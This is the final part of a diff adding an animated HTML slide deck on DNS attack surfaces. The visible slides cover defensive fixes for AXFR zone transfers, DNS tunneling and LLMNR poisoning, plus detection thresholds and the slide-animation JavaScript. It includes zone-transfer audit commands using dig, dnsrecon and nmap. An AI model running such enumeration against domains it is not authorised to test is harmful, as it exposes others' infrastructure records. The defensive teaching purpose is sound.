+        <div style="font-size:6.5px;color:#aaa;line-height:1.8">Restrict AXFR to secondary NS IPs only. Default should be <span style="color:#e85050">deny all</span>. Verify with: dnsrecon -d yourdomain -t axfr</div>
+      </div>
+
+      <!-- Fix DNS tunneling -->
+      <div id="fx_2" class="panel" style="background:#000d04;border-left:4px solid #e8a020;border-top:1px solid #1a2810;border-right:1px solid #1a2810;border-bottom:1px solid #1a2810;padding:10px 12px">
+        <div style="display:flex;align-items:center;gap:8px;margin-bottom:6px">
+          <span style="font-size:14px">🚧</span>
+          <span style="font-size:7.5px;color:#e8a020">FIX TUNNELING</span>
+        </div>
+        <div style="font-size:6.5px;color:#aaa;line-height:2.0">
+          <div style="margin-bottom:4px">• Block outbound :53 to all resolvers except <span style="color:#4eff9a">your internal DNS</span></div>
+          <div style="margin-bottom:4px">• Inspect DNS for long subdomain labels (&gt;50 chars)</div>
+          <div>• Alert on &gt;100 TXT queries/min from single host</div>
+        </div>
+      </div>
+
+      <!-- Fix LLMNR -->
+      <div id="fx_3" class="panel" style="background:#000d04;border-left:4px solid #a080ff;border-top:1px solid #1a2810;border-right:1px solid #1a2810;border-bottom:1px solid #1a2810;padding:10px 12px">
+        <div style="display:flex;align-items:center;gap:8px;margin-bottom:6px">
+          <span style="font-size:14px">🛡️</span>
+          <span style="font-size:7.5px;color:#a080ff">FIX LLMNR — GPO</span>
+        </div>
+        <div style="background:#020a04;padding:7px;font-size:6px;color:#a080ff;line-height:2.0;border:1px solid #0a1808;margin-bottom:6px">
+          GPO: Computer Config → Admin Templates<br/>
+          → Network → DNS Client<br/>
+          → <span style="color:#4eff9a">Turn off multicast name resolution</span> = <span style="color:#e85050">ENABLED</span>
+        </div>
+        <div style="font-size:6.5px;color:#aaa;line-height:1.8">Also disable NBT-NS in network adapter settings. Without LLMNR, Responder has no broadcast to poison.</div>
+      </div>
+
+      <!-- Audit cmd -->
+      <div id="fx_4" class="panel" style="background:#000d04;border:2px solid #4eff9a;padding:10px 12px">
+        <div style="font-size:7px;color:#4eff9a;margin-bottom:7px">5-SECOND AUDIT</div>
+        <div style="background:#020a04;padding:7px;font-size:6px;color:#4eff9a;line-height:2.2;border:1px solid #0a1808">
+          <div><span style="color:#4ec9e1">dig</span> axfr @ns1.yourdomain.com yourdomain.com</div>
+          <div style="color:#555"># If it dumps records → CRITICAL VULN</div>
+          <div style="margin-top:4px"><span style="color:#4ec9e1">nmap</span> -sU -p 53 --script dns-zone-transfer</div>
+        </div>
+      </div>
+
+    </div>
+  </div>
+  <div class="info gn">
+    <div class="il">Restrict AXFR, block :53 egress, disable LLMNR GPO.</div>
+    <div class="ih">DNS is recon gold — treat it like a firewall rule.</div>
+  </div>
+  <div class="srow">
+    <div class="sc"><div class="sv gn">AXFR</div><div class="sl">RESTRICT</div></div>
+    <div class="sc"><div class="sv gn">:53</div><div class="sl">FILTER OUT</div></div>
+    <div class="sc"><div class="sv gn">GPO</div><div class="sl">LLMNR OFF</div></div>
+  </div>
+  <div class="ctrl">
+    <button class="btn" onclick="go(4)">◀ PREV</button>
+    <button class="btn play" onclick="play(5)">▶ PLAY</button>
+    <button class="btn" style="border-color:#e85050;color:#e85050" onclick="go(1)">↩ RESTART</button>
+  </div>
+</div>
+
+</div><!-- #app -->
+
+<script>
+let cur=1,T=[];
+function clr(){T.forEach(t=>clearTimeout(t));T=[];}
+function af(ms,fn){T.push(setTimeout(fn,ms));}
+function show(id,ms){af(ms,()=>{const e=document.getElementById(id);if(e){e.style.opacity='1';e.classList.add('vis');}});}
+function hide(id){const e=document.getElementById(id);if(e){e.style.opacity='0';e.classList.remove('vis');}}
+function svgShow(id,ms){af(ms,()=>{const e=document.getElementById(id);if(e)e.setAttribute('opacity','1');});}
+function svgHide(id){const e=document.getElementById(id);if(e)e.setAttribute('opacity','0');}
+function svgStroke(id,color,ms){af(ms,()=>{const e=document.getElementById(id);if(e)e.setAttribute('stroke',color);});}
+function tshow(id,ms){af(ms,()=>{const e=document.getElementById(id);if(e){e.style.opacity='1';e.classList.add('vis');}});}
+
+function movePkt(id,x1,y1,x2,y2,startMs,durMs){
+  af(startMs,()=>{
+    const d=document.getElementById(id);if(!d)return;
+    d.setAttribute('cx',x1);d.setAttribute('cy',y1);d.setAttribute('opacity','1');
+    const frames=Math.max(1,Math.round(durMs/16));let f=0;
+    function step(){f++;const p=Math.min(f/frames,1);
+      d.setAttribute('cx',x1+(x2-x1)*p);d.setAttribute('cy',y1+(y2-y1)*p);
+      if(f<frames)af(16,step);else d.setAttribute('opacity','0');}
+    af(16,step);
+  });
+}
+
+function animRings(cx,cy,startMs){
+  // We animate ring radii using JS
+  const r1=document.getElementById('ll_ring1');
+  const r2=document.getElementById('ll_ring2');
+  if(!r1||!r2)return;
+  af(startMs,()=>{
+    let t=0;
+    function step(){
+      t+=16;
+      const p=Math.min(t/800,1);
+      r1.setAttribute('r',p*45+'');
+      r1.setAttribute('opacity',(1-p)+'');
+      if(t<400){r2.setAttribute('r',p*20+'');r2.setAttribute('opacity',((1-p*2))+'');}
+      if(t<800)af(16,step);
+    }
+    r1.setAttribute('opacity','1');r2.setAttribute('opacity','1');
+    af(16,step);
+  });
+}
+
+function reset(n){
+  if(n===1){
+    ['axfr_hdr','axfr_ok','axfr_r1','axfr_r2','axfr_r3','axfr_r4','axfr_r5','axfr_r6','axfr_r7','axfr_end'].forEach(id=>hide(id));
+    hide('axfr_why');hide('hook_quote');
+  }
+  if(n===2){
+    ['tn_victim','tn_vt1','tn_vt2','tn_emoji','tn_fw','tn_fwt','tn_fw_ok','tn_fw_ok2',
+     'tn_res','tn_rest1','tn_rest2','tn_rest3','tn_atk','tn_atkt1','tn_atkt2','tn_atkt3',
+     'tn_q1','tn_q2','tn_q3','tn_l1','tn_a1','tn_p1','tn_l2','tn_a2','tn_p2',
+     'tn_l3','tn_a3','tn_p3','tn_resp'].forEach(id=>svgHide(id));
+    hide('tn_query_card');hide('tn_why');
+  }
+  if(n===3){
+    ['ll_ring1','ll_ring2','ll_bcast','ll_bcast2','ll_dns','ll_dns_t','ll_dns_nx',
+     'll_atk_e','ll_atk_t','ll_atk_t2','ll_reply','ll_repl_a','ll_repl_t','ll_pkt',
+     'll_auth','ll_auth_a','ll_auth_t','ll_pkt2',
+     'll_hash_bg','ll_hash_t1','ll_hash_t2','ll_hash_t3'].forEach(id=>svgHide(id));
+    hide('ll_resp_card');
+  }
+  if(n===4){hide('tk_t1');hide('tk_t2');hide('tk_t3');hide('tk_t4');}
+  if(n===5){hide('fx_1');hide('fx_2');hide('fx_3');hide('fx_4');}
+}
+
+function play(n){
+  clr();reset(n);
+
+  if(n===1){
+    show('hook_quote',200);
+    tshow('axfr_hdr',700);
+    tshow('axfr_ok',1100);
+    ['axfr_r1','axfr_r2','axfr_r3','axfr_r4','axfr_r5','axfr_r6','axfr_r7'].forEach((id,i)=>tshow(id,1500+i*320));
+    tshow('axfr_end',3900);
+    show('axfr_why',4400);
+  }
+
+  if(n===2){
+    // boxes appear
+    svgShow('tn_victim',200);svgShow('tn_vt1',250);svgShow('tn_vt2',280);svgShow('tn_emoji',300);
+    svgShow('tn_fw',500);svgShow('tn_fwt',550);
+    svgShow('tn_res',700);svgShow('tn_rest1',750);svgShow('tn_rest2',780);svgShow('tn_rest3',800);
+    svgShow('tn_atk',900);svgShow('tn_atkt1',950);svgShow('tn_atkt2',980);svgShow('tn_atkt3',1000);
+    // query labels
+    svgShow('tn_q1',1300);svgShow('tn_q2',1450);svgShow('tn_q3',1600);
+    // packet from victim → fw
+    svgStroke('tn_l1','#e85050',1700);
+    af(1700,()=>{const a=document.getElementById('tn_a1');if(a)a.setAttribute('fill','#e85050');});
+    movePkt('tn_p1',88,100,116,100,1750,400);
+    // fw passes it
+    svgShow('tn_fw_ok',2100);svgShow('tn_fw_ok2',2150);
+    svgStroke('tn_l2','#4eff9a',2200);
+    af(2200,()=>{const a=document.getElementById('tn_a2');if(a)a.setAttribute('fill','#4eff9a');});
+    movePkt('tn_p2',136,100,160,100,2250,350);
+    // resolver → attacker NS
+    svgStroke('tn_l3','#e85050',2700);
+    af(2700,()=>{const a=document.getElementById('tn_a3');if(a)a.setAttribute('fill','#e85050');});
+    movePkt('tn_p3',228,100,270,100,2750,400);
+    svgShow('tn_resp',3200);
+    show('tn_query_card',3500);
+    show('tn_why',4200);
+  }
+
+  if(n===3){
+    // victim + attacker appear
+    svgShow('ll_atk_e',300);svgShow('ll_atk_t',350);svgShow('ll_atk_t2',380);
+    // broadcast animation
+    animRings(55,55,600);
+    svgShow('ll_bcast',700);svgShow('ll_bcast2',800);
+    // DNS says NXDOMAIN
+    svgShow('ll_dns',1000);svgShow('ll_dns_t',1050);svgShow('ll_dns_nx',1200);
+    // attacker reply
+    svgStroke('ll_reply','#e85050',1700);
+    af(1700,()=>{const a=document.getElementById('ll_repl_a');if(a)a.setAttribute('fill','#e85050');});
+    svgShow('ll_repl_t',1700);
+    movePkt('ll_pkt',290,100,78,100,1750,500);
+    // victim sends auth
+    svgStroke('ll_auth','#4ec9e1',2500);
+    af(2500,()=>{const a=document.getElementById('ll_auth_a');if(a)a.setAttribute('fill','#4ec9e1');});
+    svgShow('ll_auth_t',2500);
+    movePkt('ll_pkt2',78,128,290,128,2550,500);
+    // hash captured
+    svgShow('ll_hash_bg',3200);svgShow('ll_hash_t1',3250);svgShow('ll_hash_t2',3400);svgShow('ll_hash_t3',3550);
+    show('ll_resp_card',3800);
+  }
+
+  if(n===4){
+    show('tk_t1',300);show('tk_t2',700);show('tk_t3',1100);show('tk_t4',1500);
+  }
+
+  if(n===5){
+    show('fx_1',300);show('fx_2',750);show('fx_3',1200);show('fx_4',1700);
+  }
+}
+
+function go(n){
+  clr();
+  const prev=document.getElementById('s'+cur);
+  const next=document.getElementById('s'+n);
+  const fwd=n>cur;
+  next.style.transition='none';
+  next.style.transform=fwd?'translateX(100%)':'translateX(-100%)';
+  next.offsetHeight;
+  next.style.transition='transform .35s cubic-bezier(.4,0,.2,1)';
+  prev.style.transition='transform .35s cubic-bezier(.4,0,.2,1)';
+  prev.style.transform=fwd?'translateX(-100%)':'translateX(100%)';
+  next.style.transform='translateX(0)';
+  prev.classList.remove('active');
+  next.classList.add('active');
+  cur=n;
+  reset(n);
+  af(80,()=>play(n));
+}
+
+window.addEventListener('load',()=>{af(150,()=>play(1));});
+</script>
+</body>
+</html>
